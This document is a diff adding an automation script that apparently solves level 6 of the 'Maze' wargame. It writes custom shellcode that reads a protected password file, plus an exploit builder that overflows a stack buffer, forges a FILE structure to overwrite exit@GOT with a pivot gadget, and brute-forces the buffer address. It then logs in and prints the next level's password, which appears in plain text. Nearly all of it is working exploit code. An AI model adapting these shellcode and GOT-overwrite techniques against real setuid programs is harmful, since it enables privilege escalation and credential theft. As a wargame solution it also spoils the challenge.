@@ -1,0 +1,195 @@
+@line id
+@line ls -la /maze/maze6
+@line file /maze/maze6
+@line md5sum /maze/maze6
+@line mkdir -p /run/screen/l6 && cd /run/screen/l6
+@vi sc.py
+#!/usr/bin/env python3
+"""Maze L6 shellcode: open/read/write /etc/maze_pass/maze7 (NUL-free, no '*').
+
+Path built on the stack via pushes (NUL via a pre-push of eax); read into a
+buffer allocated below the strings (sub esp); written to fd 1; exit.
+Avoids NUL and '*' (0x2a) in every byte (argv[2] must be NUL-free, and a raw
+0x2a would become NUL in argv[2] via the frob encoding).
+"""
+import sys
+
+sc = bytes([
+    0x31, 0xC0,                       # xor eax, eax
+    0x50,                             # push eax            (NUL terminator for path)
+    0x68, 0x61, 0x7A, 0x65, 0x37,     # push "aze7"
+    0x68, 0x73, 0x73, 0x2F, 0x6D,     # push "ss/m"
+    0x68, 0x65, 0x5F, 0x70, 0x61,     # push "e_pa"
+    0x68, 0x2F, 0x6D, 0x61, 0x7A,     # push "/maz"
+    0x68, 0x2F, 0x65, 0x74, 0x63,     # push "/etc"
+    0x89, 0xE3,                       # mov ebx, esp        (path)
+    0x31, 0xC9,                       # xor ecx, ecx        (O_RDONLY)
+    0xB0, 0x05,                       # mov al, 5           (open)
+    0xCD, 0x80,                       # int 0x80
+    0x89, 0xC3,                       # mov ebx, eax        (fd)
+    0x83, 0xEC, 0x20,                 # sub esp, 0x20       (buffer)
+    0x89, 0xE1,                       # mov ecx, esp        (buf)
+    0x31, 0xD2,                       # xor edx, edx
+    0xB2, 0x0F,                       # mov dl, 15          (count)
+    0xB0, 0x03,                       # mov al, 3           (read)
+    0xCD, 0x80,                       # int 0x80
+    0x31, 0xDB,                       # xor ebx, ebx
+    0xB3, 0x01,                       # mov bl, 1           (fd 1)
+    0x89, 0xE1,                       # mov ecx, esp        (buf)
+    0x89, 0xC2,                       # mov edx, eax        (nread)
+    0xB0, 0x04,                       # mov al, 4           (write)
+    0xCD, 0x80,                       # int 0x80
+    0x31, 0xDB,                       # xor ebx, ebx
+    0xB0, 0x01,                       # mov al, 1           (exit)
+    0xCD, 0x80,                       # int 0x80
+])
+
+if __name__ == "__main__":
+    bad = set(b"\x00\x2a")
+    assert not (bad & set(sc)), [hex(b) for b in sc if b in bad]
+    assert 0 not in bytes(b ^ 42 for b in sc), "frobbed sc has NUL"
+    sys.stdout.buffer.write(sc)
+@viend
+@line python3 sc.py > sc.bin && wc -c sc.bin
+@vi exploit.py
+#!/usr/bin/env python3
+"""Maze L6 exploit builder v5.
+
+Stack layout (measured with the raw ~519-byte payload, gdb --args):
+    buf         = ebp - 0x104          (strcpy target, 0x100 bytes)
+    buf+0x100   = FILE* f              (overwrite -> fake FILE at buf+0x220)
+    buf+0x104   = saved ebx (0x0804b11c)
+    buf+0x108   = saved eip            (dead: main ends with exit(0))
+    buf+0x10c   = argc (3)             -- caller frame, OVERFLOW-REACHABLE
+    buf+0x110   = argv pointer         -- repair -> buf+0x1d0
+    buf+0x114   = envp pointer         -- repair -> buf+0x1dc (argv NULL slot)
+    buf+0x1d0   = argv[0..2] + NULL    -- INSIDE the overflow, repair pointers
+    buf+0x220   = fake FILE (copy of the real heap FILE, redirected write pointers)
+    buf+0x2c0   = shellcode (open/read/write /etc/maze_pass/maze7 -> fd 1)
+
+buf[0..4] = leave;ret (libc+0x1af32e): the fprintf line "path : buf" starts at
+exit@GOT-24, so buf[0..4] lands exactly on exit@GOT. After fprintf, `call
+exit@plt -> jmp *GOT` runs leave;ret: esp := ebp, pop ebp, ret -> eip =
+[buf+0x108] = shellcode.
+
+Raw payload may contain NULs (they ride in argv[2] as 0x2a bytes and memfrob
+restores them after the full-length strlen); argv[2] itself must be NUL-free,
+so the raw payload must not contain 0x2a.
+"""
+import struct, sys
+
+LIBC = 0xF7D6D000
+GADGET_LEAVE_RET = LIBC + 0x1AF32E          # leave; ret
+SAVED_EBX        = 0x0804B11C
+
+EXIT_GOT = 0x0804B228
+FAKE_OFF = 0x1E0                            # fake FILE inside buf (right after argv[])
+PATH_OFF = 0x284                            # path string copy inside buf (NUL-terminated)
+SC_OFF   = 0x2A0                            # shellcode inside buf (after the path copy)
+ARGV_OFF = 0x1D0                            # argv[0..2] + NULL
+STR_A0   = 0x318                            # "/run/screen/l6/m6" (rel. buf)
+STR_A1   = 0x32A                            # path            (rel. buf)
+STR_A2   = 0x340                            # payload text    (rel. buf)
+
+REAL_FILE = bytes.fromhex(
+    "84 3c ad fb 50 c1 04 08 50 c1 04 08 50 c1 04 08 "
+    "50 c1 04 08 6d c1 04 08 50 d1 04 08 50 c1 04 08 "
+    "50 d1 04 08 00 00 00 00 00 00 00 00 00 00 00 00 "
+    "00 00 00 00 40 3c fa f7 03 00 00 00 00 00 00 00 "
+    "00 00 00 00 00 00 00 00 a8 c0 04 08 ff ff ff ff "
+    "ff ff ff ff 00 00 00 00 b4 c0 04 08 00 00 00 00 "
+    "00 00 00 00 20 3c fa f7 ff ff ff ff 00 00 00 00 "
+    "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
+    "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
+    "00 00 00 00 a8 27 fa f7 00 00 00 00 00 00 00 00"
+)
+
+def build(buf_addr: int, path: bytes, shellcode: bytes) -> bytes:
+    line_prefix = len(path) + 3
+    fake = buf_addr + FAKE_OFF
+    wbase = EXIT_GOT - line_prefix
+
+    fp = bytearray(REAL_FILE)
+    fp[0x10:0x14] = struct.pack("<I", wbase)           # _IO_write_base
+    fp[0x14:0x18] = struct.pack("<I", wbase)           # _IO_write_ptr
+    fp[0x18:0x1c] = struct.pack("<I", wbase + 0x800)   # _IO_write_end
+    fp[0x1c:0x20] = struct.pack("<I", wbase)           # _IO_buf_base
+    fp[0x20:0x24] = struct.pack("<I", wbase + 0x800)   # _IO_buf_end
+
+    p = bytearray(b"A" * 0x100)
+    p[0:4] = struct.pack("<I", GADGET_LEAVE_RET)        # buf[0..4] -> exit@GOT
+    p += struct.pack("<I", fake)                        # f @ buf+0x100
+    p += struct.pack("<I", SAVED_EBX)                   # saved ebx
+    p += struct.pack("<I", buf_addr + SC_OFF)           # saved eip (pivot target)
+    p += struct.pack("<I", 3)                           # argc
+    p += struct.pack("<I", buf_addr + ARGV_OFF)         # argv pointer
+    p += struct.pack("<I", buf_addr + ARGV_OFF + 0xc)   # envp pointer
+    p += b"B" * (ARGV_OFF - len(p))
+    p += struct.pack("<I", buf_addr + STR_A0)           # argv[0]
+    p += struct.pack("<I", buf_addr + PATH_OFF)         # argv[1] -> path INSIDE payload
+    p += struct.pack("<I", buf_addr + STR_A2)           # argv[2]
+    p += struct.pack("<I", 0)                           # argv NULL
+    p += fp
+    p += b"C" * (PATH_OFF - len(p))
+    p += path + b"\x00"                                 # the path string, payload-internal
+    p += b"C" * (SC_OFF - len(p))
+    p += shellcode
+
+    assert 0x2a not in p, "raw payload has 0x2a -> NUL in argv[2]"
+    argv2 = bytes(b ^ 42 for b in p)
+    assert 0 not in argv2, "argv[2] has NUL"
+    return argv2
+
+if __name__ == "__main__":
+    buf = int(sys.argv[1], 16)
+    path = sys.argv[2].encode()
+    sc = bytes.fromhex(sys.argv[3])
+    sys.stdout.buffer.write(build(buf, path, sc))
+@viend
+@vi w6.py
+#!/usr/bin/env python3
+"""Maze L6 sweep: buf's stack address is env-dependent (gdb measured 0xffffd824),
+so the sweep runs inside the live session's own environment, descending from the
+measured center over the whole plausible band. A hit shows as the shellcode's
+write() output: the password printed by the child."""
+import subprocess, importlib.util
+
+spec = importlib.util.spec_from_file_location("exploit", "/run/screen/l6/exploit.py")
+ex = importlib.util.module_from_spec(spec)
+spec.loader.exec_module(ex)
+
+sc = open("/run/screen/l6/sc.bin", "rb").read()
+path = b"/run/screen/l6/wP.txt"
+
+for delta in range(-0x1000, 0x101, 4):
+    buf = 0xffffd024 + delta
+    try:
+        pay = ex.build(buf, path, sc)
+    except AssertionError:
+        continue
+    try:
+        r = subprocess.run(["/maze/maze6", path, pay], capture_output=True, timeout=5)
+    except subprocess.TimeoutExpired:
+        continue
+    if r.returncode == 0 and r.stdout:
+        print("HIT buf", hex(buf))
+        print(r.stdout.decode("latin-1"))
+        break
+else:
+    print("none")
+@viend
+@line printf 'placeholder\n' > wP.txt
+@line timeout 900 python3 w6.py
+@waitfor ckkOx2s4Ev 
+@sleep 3
+@line exit
+@line exit
+@sleep 2
+@login2
+@line id
+@waitfor uid=15007 
+@line cat /etc/maze_pass/maze7
+@waitfor ckkOx2s4Ev 
+@sleep 1
+@line exit
+@sleep 2
